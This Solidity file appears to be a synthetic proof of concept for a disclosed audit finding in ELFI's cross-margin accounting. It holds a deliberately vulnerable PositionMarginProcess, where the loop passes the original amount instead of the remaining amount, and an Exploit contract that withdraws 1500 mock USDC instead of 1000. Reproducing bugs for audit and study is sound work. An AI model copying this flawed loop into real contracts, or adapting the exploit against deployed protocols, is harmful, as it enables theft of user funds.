// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  ELFI PositionMarginProcess.updateAllPositionFromBalanceMargin — each
    remaining position is incremented by the original settled amount
    (Sherlock H-4, finding 34766). SYNTHETIC, cheatcode-free.
    Root cause: the loop tracks reduceAmount but still passes `amount`
    into updatePositionFromBalanceMargin, and that function does +=.
    ETH consumes 500 of a 1000 settlement. SOL is still incremented by
    the original 1000, so its from-balance becomes 1000, twice the 500
    it should have been set to. The extra 500 is margin the account
    can pull. */

contract USDC {
    string public name = "USD Coin";
    string public symbol = "USDC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PositionMarginProcess {
    struct Position {
        bytes32 key;
        address marginToken;
        bool isCrossMargin;
        uint256 initialMargin;
        uint256 initialMarginInUsd;
        uint256 initialMarginInUsdFromBalance;
    }

    USDC public usdc;
    address public marginToken;
    bytes32[] public keys;
    mapping(bytes32 => Position) public positions;
    uint256 public credited;

    constructor(address _usdc) {
        usdc = USDC(_usdc);
        marginToken = _usdc;
    }

    function addPosition(
        bytes32 key,
        uint256 initialMargin,
        uint256 initialMarginInUsd
    ) external {
        keys.push(key);
        Position storage position = positions[key];
        position.key = key;
        position.marginToken = marginToken;
        position.isCrossMargin = true;
        position.initialMargin = initialMargin;
        position.initialMarginInUsd = initialMarginInUsd;
    }

    function updateAllPositionFromBalanceMargin(int256 amount, bytes32 originPositionKey) external virtual {
        if (amount == 0) return;

        int256 reduceAmount = amount;
        for (uint256 i; i < keys.length; i++) {
            Position storage position = positions[keys[i]];
            if (marginToken == position.marginToken && position.isCrossMargin) {
                int256 changeAmount = int256(
                    updatePositionFromBalanceMargin(
                        keys[i],
                        originPositionKey.length > 0 && originPositionKey == position.key,
                        amount
                    )
                );
                reduceAmount = amount > 0 ? reduceAmount - changeAmount : reduceAmount + changeAmount;
                if (reduceAmount == 0) break;
            }
        }
    }

    function updatePositionFromBalanceMargin(bytes32 key, bool isOrigin, int256 amount)
        public
        virtual
        returns (uint256 changeAmount)
    {
        if (isOrigin || amount <= 0) return 0;
        Position storage position = positions[key];
        uint256 borrowMargin = (position.initialMarginInUsd - position.initialMarginInUsdFromBalance)
            * position.initialMargin / position.initialMarginInUsd;
        uint256 amountUint = uint256(amount);
        changeAmount = amountUint < borrowMargin ? amountUint : borrowMargin;
        // @> VULN: from-balance is incremented by the original amount. SOL becomes 1000, twice the 500 it should be set to
        position.initialMarginInUsdFromBalance +=
            changeAmount * position.initialMarginInUsd / position.initialMargin;
        // FIX: pass reduceAmount, and set initialMarginInUsdFromBalance to that credit instead of adding the original amount
    }

    function pullCreditedMargin(address to) external returns (uint256 paid) {
        for (uint256 i; i < keys.length; i++) {
            paid += positions[keys[i]].initialMarginInUsdFromBalance;
        }
        credited = paid;
        usdc.transfer(to, paid);
    }
}

contract Exploit {
    uint256 public constant SETTLED = 1000e18;
    uint256 public constant ETH_MARGIN = 500e18;
    uint256 public constant SOL_MARGIN = 1000e18;
    bytes32 public constant ETH_KEY = bytes32(uint256(1));
    bytes32 public constant SOL_KEY = bytes32(uint256(2));
    bytes32 public constant CLOSED = bytes32(uint256(3));

    USDC public usdc; // nonce 1
    PositionMarginProcess public book; // nonce 2

    uint256 public ethSize;
    uint256 public solSize;
    uint256 public fairSol;
    uint256 public extraMargin;
    uint256 public extraBorrow;
    uint256 public withdrawn;
    uint256 public fairWithdraw;

    constructor() {
        usdc = new USDC();
        book = new PositionMarginProcess(address(usdc));
        usdc.mint(address(book), 1500e18);
        book.addPosition(ETH_KEY, ETH_MARGIN, ETH_MARGIN);
        book.addPosition(SOL_KEY, SOL_MARGIN, SOL_MARGIN);
    }

    function run() external {
        book.updateAllPositionFromBalanceMargin(int256(SETTLED), CLOSED);

        (, , , , , ethSize) = book.positions(ETH_KEY);
        (, , , , , solSize) = book.positions(SOL_KEY);
        fairSol = SETTLED - ETH_MARGIN;
        extraMargin = solSize - fairSol;
        extraBorrow = extraMargin * 5;

        withdrawn = book.pullCreditedMargin(address(this));
        fairWithdraw = ETH_MARGIN + fairSol;

        require(ethSize == ETH_MARGIN, "ETH credit");
        require(solSize == SOL_MARGIN, "SOL was not doubled");
        require(fairSol == ETH_MARGIN, "fair SOL");
        require(solSize == fairSol * 2, "SOL size is not 2x");
        require(extraMargin == 500e18, "extra margin");
        require(extraBorrow == 2500e18, "extra borrow");
        require(withdrawn == 1500e18, "pulled the inflated credit");
        require(fairWithdraw == 1000e18, "fair pull");
        require(withdrawn > fairWithdraw, "no excess");
    }
}
